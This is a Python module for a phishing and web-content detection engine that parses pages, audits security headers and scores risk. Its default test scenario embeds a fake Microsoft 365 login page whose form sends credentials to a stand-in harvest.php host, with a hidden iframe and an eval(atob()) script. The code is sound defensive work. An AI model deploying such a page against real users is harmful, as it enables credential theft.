from typing import Optional, List, Dict, Any
from pydantic import BaseModel, Field
import time

from .common import (
    StandardEngineResponse,
    AnalysisMode,
    Verdict,
    Severity,
    Finding,
    EvidenceItem,
    TriggeredRule
)

try:
    from content.fetcher import fetch_and_analyze_http
    from content.html_parser import analyze_html_dom
    from content.headers import analyze_security_headers
except ImportError:
    from ..content.fetcher import fetch_and_analyze_http
    from ..content.html_parser import analyze_html_dom
    from ..content.headers import analyze_security_headers

class ContentAnalysisRequest(BaseModel):
    url: Optional[str] = None
    raw_html: Optional[str] = None
    sample_scenario: Optional[str] = None

def analyze_web_content(request: ContentAnalysisRequest) -> StandardEngineResponse:
    findings: List[Finding] = []
    evidence_items: List[EvidenceItem] = []
    triggered_rules: List[TriggeredRule] = []
    recommendations: List[str] = []
    limitations: List[str] = []
    risk_score = 10
    mode = AnalysisMode.LIVE

    http_res = None
    dom_res = None
    headers_res = None
    target_url = request.url

    if request.url:
        try:
            http_res, raw_evidence = fetch_and_analyze_http(request.url)
            for item in raw_evidence:
                evidence_items.append(EvidenceItem(
                    source="HTTPFetcher",
                    type="http_evidence",
                    description=item.description,
                    raw_data={"severity": item.severity}
                ))
            dom_res = http_res.dom
            headers_res = http_res.headers
            if http_res.status == "blocked":
                findings.append(Finding(
                    id="F-M02-BLOCKED",
                    title="SSRF / Prohibited Network Range Blocked",
                    severity=Severity.CRITICAL,
                    description=f"Destination {request.url} violates SSRF protection boundaries.",
                    mitre_id="T1190"
                ))
                triggered_rules.append(TriggeredRule(
                    rule_id="RULE-M02-SSRF",
                    name="SSRF Defense Boundary Violation",
                    severity=Severity.CRITICAL,
                    points=90,
                    description="Outbound request targeted internal, private, loopback, or cloud-metadata IP.",
                    mitre_id="T1190"
                ))
                risk_score = 95
        except Exception as e:
            limitations.append(f"HTTP live acquisition error: {str(e)}")
    elif request.raw_html:
        mode = AnalysisMode.SIMULATED
        target_url = "https://synthetic-payload.local/login.html"
        dom_res, dom_evidence = analyze_html_dom(request.raw_html, base_url=target_url)
        headers_res, headers_evidence = analyze_security_headers({
            "Content-Type": "text/html",
            "Server": "Apache/2.4.41"
        })
        for item in dom_evidence:
            evidence_items.append(EvidenceItem(
                source="DOMParser",
                type="dom_signal",
                description=item.description,
                raw_data={"severity": item.severity}
            ))
    else:
        # Default scenario: Credential Harvester with Off-Domain Submission
        mode = AnalysisMode.SIMULATED
        sample_html = """
        <!DOCTYPE html>
        <html>
        <head><title>Microsoft 365 Login Portal - Verify Account</title></head>
        <body>
            <h2>Sign in to continue</h2>
            <form action="http://198.51.100.42:8080/harvest.php" method="POST">
                <input type="text" name="username" placeholder="Email" />
                <input type="password" name="password" placeholder="Password" />
                <button type="submit">Sign In</button>
            </form>
            <iframe src="http://hidden-tracking-pixel.biz/embed" style="display:none;width:0;height:0;"></iframe>
            <script>
                document.oncontextmenu = function() { return false; };
                eval(atob("Y29uc29sZS5sb2coJ2tlcm5lbF9pbmplY3Rpb24nKQ=="));
            </script>
        </body>
        </html>
        """
        target_url = "https://login.microsoft.verify-tenant.xyz"
        dom_res, dom_evidence = analyze_html_dom(sample_html, base_url=target_url)
        headers_res, headers_evidence = analyze_security_headers({
            "Content-Type": "text/html",
            "Server": "nginx/1.18.0"
        })
        for item in dom_evidence:
            evidence_items.append(EvidenceItem(
                source="DOMParser",
                type="dom_signal",
                description=item.description,
                raw_data={"severity": item.severity}
            ))

    # Evaluate DOM
    if dom_res:
        if dom_res.has_off_domain_form_submission:
            risk_score += 45
            findings.append(Finding(
                id="F-M02-OFFDOMAIN",
                title="Off-Domain Credential Exfiltration Action",
                severity=Severity.CRITICAL,
                description="HTML form submits credentials or user input to a completely different apex domain or unverified third party.",
                mitre_id="T1566.002",
                evidence=f"Form action points to external endpoint"
            ))
            triggered_rules.append(TriggeredRule(
                rule_id="RULE-M02-FORM-OFFDOMAIN",
                name="Off-Domain Form Submission",
                severity=Severity.CRITICAL,
                points=45,
                description="Form action target hostname mismatches originating host domain.",
                mitre_id="T1566.002"
            ))

        if dom_res.has_credential_form:
            evidence_items.append(EvidenceItem(
                source="DOMParser",
                type="form_inspection",
                description=f"Identified credential password collection form with {len(dom_res.forms)} total forms."
            ))

        if dom_res.brand_impersonation_suspected:
            risk_score += 35
            findings.append(Finding(
                id="F-M02-BRAND",
                title="Suspected Brand Visual Impersonation",
                severity=Severity.HIGH,
                description=f"Page title references '{dom_res.detected_brand_in_title}' on an unauthorized host.",
                mitre_id="T1566.002",
                evidence=f"Title: {dom_res.title}"
            ))
            triggered_rules.append(TriggeredRule(
                rule_id="RULE-M02-BRAND-MIMICRY",
                name="Brand Impersonation in Title/Metadata",
                severity=Severity.HIGH,
                points=35,
                description="Target apex domain does not match claimed enterprise service brand.",
                mitre_id="T1566.002"
            ))

        if dom_res.has_hidden_iframes:
            risk_score += 25
            findings.append(Finding(
                id="F-M02-IFRAME",
                title="Hidden Zero-Dimension Iframe Detected",
                severity=Severity.HIGH,
                description="Zero-pixel or style='display:none' iframe embedded in page DOM (common in silent clickjacking or credential sniffing).",
                mitre_id="T1189",
                evidence=f"Found {dom_res.total_iframes} iframes"
            ))
            triggered_rules.append(TriggeredRule(
                rule_id="RULE-M02-HIDDEN-IFRAME",
                name="Hidden Iframe Embedding",
                severity=Severity.HIGH,
                points=25,
                description="Iframe dimension 0x0 or display:none detected.",
                mitre_id="T1189"
            ))

        if dom_res.js_signals.has_context_menu_blocker:
            risk_score += 15
            triggered_rules.append(TriggeredRule(
                rule_id="RULE-M02-ANTI-INSPECT",
                name="Anti-Inspection Context Menu Blocker",
                severity=Severity.MEDIUM,
                points=15,
                description="JavaScript disables right-click or DevTools keyboard shortcuts.",
                mitre_id="T1027"
            ))

        if dom_res.js_signals.has_obfuscated_code or dom_res.js_signals.has_eval:
            risk_score += 20
            findings.append(Finding(
                id="F-M02-OBFUSCATION",
                title="Dynamic Script Execution / Obfuscation",
                severity=Severity.HIGH,
                description="Detected dynamic eval() calls or Base64 decoding routines inside inline script tags.",
                mitre_id="T1027",
                evidence="eval() or atob() runtime pattern found"
            ))
            triggered_rules.append(TriggeredRule(
                rule_id="RULE-M02-JS-EVAL",
                name="Inline Script Obfuscation/Eval",
                severity=Severity.HIGH,
                points=20,
                description="Inline script executes dynamic code via eval or decoding primitives.",
                mitre_id="T1027"
            ))

    # Evaluate Security Headers
    if headers_res:
        missing = headers_res.missing_headers
        if missing:
            evidence_items.append(EvidenceItem(
                source="HeaderAuditor",
                type="security_headers",
                description=f"Missing recommended security headers: {', '.join(missing[:4])}"
            ))
            if "Strict-Transport-Security" in missing:
                risk_score += 5
                triggered_rules.append(TriggeredRule(
                    rule_id="RULE-M02-MISSING-HSTS",
                    name="Missing HSTS Header",
                    severity=Severity.LOW,
                    points=5,
                    description="No Strict-Transport-Security header configured."
                ))
            if "Content-Security-Policy" in missing:
                risk_score += 5
                triggered_rules.append(TriggeredRule(
                    rule_id="RULE-M02-MISSING-CSP",
                    name="Missing Content-Security-Policy",
                    severity=Severity.LOW,
                    points=5,
                    description="No CSP header to restrict script execution origins."
                ))

    risk_score = min(100, max(0, risk_score))
    if risk_score >= 70:
        verdict = Verdict.MALICIOUS
        summary = "High-confidence malicious web content detected: Off-domain credential harvesting and deceptive DOM elements."
        recommendations = [
            "Block access to this domain at web gateway / perimeter firewall",
            "Do not enter passwords or personal data into this form",
            "Purge any cached browser credentials submitted to this domain"
        ]
    elif risk_score >= 35:
        verdict = Verdict.SUSPICIOUS
        summary = "Suspicious web content: Page lacks essential security headers or uses deceptive script patterns."
        recommendations = [
            "Inspect target form actions before entering information",
            "Verify apex domain ownership against official brand channels",
            "Enable browser isolation or sandbox inspection"
        ]
    else:
        verdict = Verdict.SAFE
        summary = "Web content analysis completed. No malicious form actions, hidden iframes, or deceptive scripts detected."
        recommendations = [
            "Maintain standard security posture",
            "Verify valid TLS certificate before entering confidential data"
        ]

    if not limitations:
        limitations.append("Static DOM and HTTP header inspection; does not execute untrusted JavaScript (client-safe).")

    return StandardEngineResponse(
        engine_id="M-02",
        engine_name="Web Content Intelligence",
        analysis_mode=mode,
        verdict=verdict,
        risk_score=risk_score,
        confidence=0.91 if mode == AnalysisMode.LIVE else 0.95,
        summary=summary,
        findings=findings,
        evidence=evidence_items,
        triggered_rules=triggered_rules,
        recommendations=recommendations,
        limitations=limitations,
        metadata={
            "url": target_url,
            "total_forms": dom_res.total_forms if dom_res else 0,
            "total_iframes": dom_res.total_iframes if dom_res else 0,
            "has_credential_form": dom_res.has_credential_form if dom_res else False,
            "missing_headers": headers_res.missing_headers if headers_res else []
        }
    )
